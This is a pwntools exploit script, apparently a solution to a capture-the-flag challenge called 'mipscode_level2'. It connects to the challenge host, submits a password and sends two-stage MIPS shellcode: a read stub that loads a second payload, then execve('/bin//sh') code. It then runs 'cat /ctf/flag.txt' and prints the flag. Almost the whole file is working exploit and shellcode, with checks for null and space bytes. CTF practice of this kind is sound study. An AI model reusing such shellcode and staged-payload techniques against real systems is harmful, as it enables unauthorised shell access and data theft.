#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ template template --host mipscode-level2.chal.cyberjousting.com --port 1356 mipscode_level2
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'mipscode_level2')

if args.DBG:
    context.log_level = 'debug'

# ./exploit.py DBG - context.log_level = 'debug'
# ./exploit.py NOASLR - turn off aslr
# ./exploit.py GDB HOST=example.com PORT=4141 EXE=/tmp/executable
host = args.HOST or 'mipscode-level2.chal.cyberjousting.com'
port = int(args.PORT or 1357)


def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    p = connect(host, port)
    if args.GDB:
        gdb.attach(p, gdbscript=gdbscript)
    return p

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# MACROS
def s(a) : return p.send(a)
def sl(a) : return p.sendline(a)
def sa(a,b) : return p.sendafter(a,b)
def sla(a,b) : return p.sendlineafter(a,b)
def rv(a) : return p.recv(a)
def ru(a) : return p.recvuntil(a)
def ra() : return p.recvall()
def rl() : return p.recvline()
def cyc(a): return cyclic(a)
def inr() : return p.interactive()
def rfg(var,a) : return var.find_gadget(a)
def rch(var) : return var.chain()
def rdm(var) : return var.dump()
def cls() : return p.close()

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
b * 0x40000dac
c
'''.format(**locals())


'''
>>>>>>>>>>>>>>>>>>>>>>>>>>>>>><<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
                        BEGIN EXPLOIT
>>>>>>>>>>>>>>>>>>>>>>>>>>>>>><<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
'''
# Arch:     mips-32-little
# RELRO:    Full RELRO
# Stack:    No canary found
# NX:       NX unknown - GNU_STACK missing
# PIE:      PIE enabled
# Stack:    Executable
# RWX:      Has RWX segments

p = start()

mipscode = asm('''
    lui $t7, 0x6962          
    ori $t7, $t7,0x2f2f
    lui $t6, 0x6873
    ori $t6, $t6, 0x2f6e
    sw $t7, -12($sp)       
    sw $t6, -8($sp)        
    sw $zero, -4($sp)     
    addiu $a0, $sp, -12    
    slti $a1, $zero, -1    
    slti $a2, $zero, -1    
    li $v0, 4011
    syscall 0x040405       
    ''')

readcode = asm('''
    li $v0, 4003
    slti $a0, $0, -1
    addi $sp, $sp, 0x4165
    sub $sp, $sp, 0x4139
    lw $a1, -4($sp)
    li $a2, 0x0199
    syscall 0x40405
    ''')

sla(b'password',b'8ff28f88f91b8f93006ed39cba6217e2860cb2c004eb490a1b16aeb2948164d6')

info(f"READCODE: {readcode}")
info(f"RC SIZE: {len(readcode)}")
info(f"MC SIZE: {len(mipscode)}")

if ((b'\x00' in readcode) or (b'\x20' in readcode)):
    warn("IT NO WORK")

sa(b'Shellcode>',readcode)

pause()

sl(mipscode.rjust((len(mipscode)+0x90),b'\x00'))

# sl(b"echo '$$'")
sl(b'cat /ctf/flag.txt')
# ru(b'$$\n')
flag = rl().decode()
log.success(f"FLAG: {flag}")


